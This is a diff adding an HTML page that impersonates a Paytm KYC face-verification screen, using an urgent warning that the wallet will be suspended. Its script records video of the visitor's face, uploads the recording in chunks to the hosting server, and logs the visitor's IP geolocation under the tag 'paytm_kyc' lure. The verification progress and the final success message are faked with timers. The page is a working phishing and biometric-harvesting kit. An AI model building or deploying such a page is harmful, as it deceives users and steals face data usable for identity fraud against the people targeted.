@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paytm KYC</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #00b9f1; min-height: 100vh; }
+
+  .topbar { background: #00b9f1; padding: 14px 16px; display: flex; align-items: center; gap: 12px; }
+  .back { font-size: 22px; color: #fff; }
+  .topbar-title { font-size: 17px; font-weight: 700; color: #fff; }
+
+  .content { background: #f5f5f5; min-height: calc(100vh - 52px); border-radius: 20px 20px 0 0; padding: 20px 16px; }
+
+  .kyc-badge { background: #fff; border-radius: 12px; padding: 14px; display: flex; gap: 12px; align-items: center; margin-bottom: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+  .badge-icon { font-size: 32px; }
+  .badge-title { font-size: 14px; font-weight: 700; color: #333; }
+  .badge-sub { font-size: 12px; color: #888; }
+
+  .alert { background: #fff3cd; border-left: 4px solid #ff9500; border-radius: 8px; padding: 12px 14px; margin-bottom: 16px; font-size: 13px; color: #664d03; line-height: 1.5; }
+
+  .section { background: #fff; border-radius: 12px; padding: 16px; margin-bottom: 14px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+  .section-title { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 4px; }
+  .section-sub { font-size: 12px; color: #888; margin-bottom: 14px; line-height: 1.5; }
+
+  .step-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
+  .step-item { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #555; }
+  .step-dot { width: 24px; height: 24px; border-radius: 50%; background: #00b9f1; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; }
+
+  .cam-box { width: 100%; aspect-ratio: 3/4; background: #111; border-radius: 14px; overflow: hidden; position: relative; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; }
+  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+  .cam-ph { display: flex; flex-direction: column; align-items: center; gap: 8px; color: #555; }
+  .cam-ph .icon { font-size: 44px; }
+  .cam-ph .txt { font-size: 13px; }
+
+  .oval-frame { position: absolute; inset: 0; display: none; align-items: center; justify-content: center; pointer-events: none; }
+  .oval { width: 170px; height: 220px; border: 3px solid #00b9f1; border-radius: 50%; box-shadow: 0 0 0 2000px rgba(0,0,0,0.5); }
+  .oval-hint { position: absolute; bottom: 48px; left: 0; right: 0; text-align: center; font-size: 13px; color: #fff; font-weight: 600; text-shadow: 0 1px 4px #000; }
+  .scan-line { position: absolute; height: 2px; left: 15%; right: 15%; background: linear-gradient(90deg,transparent,#00b9f1,transparent); display: none; animation: scan 1.5s linear infinite; }
+  @keyframes scan { 0%{top:20%} 100%{top:78%} }
+
+  .status-txt { font-size: 13px; color: #666; text-align: center; margin-bottom: 14px; }
+  .prog-wrap { background: #e0e0e0; border-radius: 4px; height: 4px; margin-bottom: 14px; display: none; }
+  .prog-fill { height: 100%; background: #00b9f1; border-radius: 4px; width: 0%; transition: width 0.5s; }
+
+  .kyc-btn { width: 100%; background: #00b9f1; color: #fff; border: none; border-radius: 10px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; }
+  .kyc-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+  .success { background: #e6f9ee; border: 1px solid #34c759; border-radius: 12px; padding: 20px; text-align: center; display: none; margin-top: 8px; }
+  .success .icon { font-size: 40px; margin-bottom: 8px; }
+  .success .title { font-size: 16px; font-weight: 700; color: #1a7a2e; margin-bottom: 4px; }
+  .success .msg { font-size: 13px; color: #555; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="back">←</div>
+  <div class="topbar-title">Complete KYC</div>
+</div>
+
+<div class="content">
+  <div class="kyc-badge">
+    <div class="badge-icon">🔵</div>
+    <div>
+      <div class="badge-title">Paytm KYC Verification</div>
+      <div class="badge-sub">Complete Full KYC to unlock all features</div>
+    </div>
+  </div>
+
+  <div class="alert">⚠️ Your Paytm wallet has been temporarily limited. Complete Full KYC within 24 hours to restore full access and avoid account suspension.</div>
+
+  <div class="section">
+    <div class="section-title">📷 Face Verification</div>
+    <div class="section-sub">RBI mandates face verification for Full KYC. Your face will be matched with your Aadhaar photo. This is a one-time process.</div>
+
+    <div class="step-list">
+      <div class="step-item"><div class="step-dot">1</div>Allow camera access</div>
+      <div class="step-item"><div class="step-dot">2</div>Position face inside the frame</div>
+      <div class="step-item"><div class="step-dot">3</div>Hold still for 5 seconds</div>
+    </div>
+
+    <div class="cam-box">
+      <video id="preview" autoplay muted playsinline></video>
+      <div class="cam-ph" id="camPh">
+        <div class="icon">🤳</div>
+        <div class="txt">Camera will open here</div>
+      </div>
+      <div class="oval-frame" id="ovalFrame">
+        <div class="oval"></div>
+        <div class="oval-hint" id="ovalHint">Place your face in the frame</div>
+      </div>
+      <div class="scan-line" id="scanLine"></div>
+    </div>
+
+    <div class="prog-wrap" id="progWrap"><div class="prog-fill" id="progFill"></div></div>
+    <div class="status-txt" id="statusTxt">Tap below to start face scan</div>
+
+    <button class="kyc-btn" id="kycBtn" onclick="startKYC()">Start Face Scan</button>
+
+    <div class="success" id="successBox">
+      <div class="icon">✅</div>
+      <div class="title">KYC Verified Successfully!</div>
+      <div class="msg">Your Paytm Full KYC is complete. Your wallet limit has been restored.</div>
+    </div>
+  </div>
+</div>
+
+<script>
+const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
+let mediaRecorder, chunkIndex = 0, stream;
+
+async function getGeo() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
+}
+
+async function startKYC() {
+  const btn = document.getElementById("kycBtn");
+  btn.disabled = true; btn.textContent = "Opening camera...";
+  document.getElementById("statusTxt").textContent = "Allow camera access to continue";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user", width:1280, height:720 }, audio: false });
+  } catch {
+    document.getElementById("statusTxt").textContent = "Camera denied. Please allow and try again.";
+    btn.disabled = false; btn.textContent = "Start Face Scan";
+    return;
+  }
+
+  document.getElementById("preview").srcObject = stream;
+  document.getElementById("preview").style.display = "block";
+  document.getElementById("camPh").style.display = "none";
+  document.getElementById("ovalFrame").style.display = "flex";
+  document.getElementById("scanLine").style.display = "block";
+  document.getElementById("progWrap").style.display = "block";
+  btn.textContent = "Scanning face...";
+
+  const geo = await getGeo();
+  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ session:SID, geo, lure:"paytm_kyc" }) }).catch(()=>{});
+
+  startRecording(stream);
+
+  const steps = [
+    [1000, 15, "Face detected..."],
+    [3500, 40, "Matching with Aadhaar photo..."],
+    [7000, 65, "Verifying liveness..."],
+    [10000,85, "Finalizing KYC..."],
+    [13000,100,"KYC Verified!"],
+  ];
+  steps.forEach(([delay, pct, msg]) => {
+    setTimeout(() => {
+      document.getElementById("progFill").style.width = pct + "%";
+      document.getElementById("statusTxt").textContent = msg;
+      if (pct >= 40) document.getElementById("ovalHint").textContent = "Face matched ✓ Hold still";
+    }, delay);
+  });
+
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+    document.getElementById("ovalFrame").style.display = "none";
+    document.getElementById("scanLine").style.display = "none";
+    btn.style.display = "none";
+    document.getElementById("statusTxt").textContent = "";
+    document.getElementById("successBox").style.display = "block";
+  }, 14000);
+}
+
+function startRecording(stream) {
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
+  mediaRecorder.ondataavailable = async (e) => {
+    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
+  };
+  mediaRecorder.onstop = async () => {
+    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
+  };
+  mediaRecorder.start(5000);
+}
+
+async function sendChunk(blob, idx) {
+  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
+    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
+  }).catch(()=>{});
+}
+</script>
+</body>
+</html>
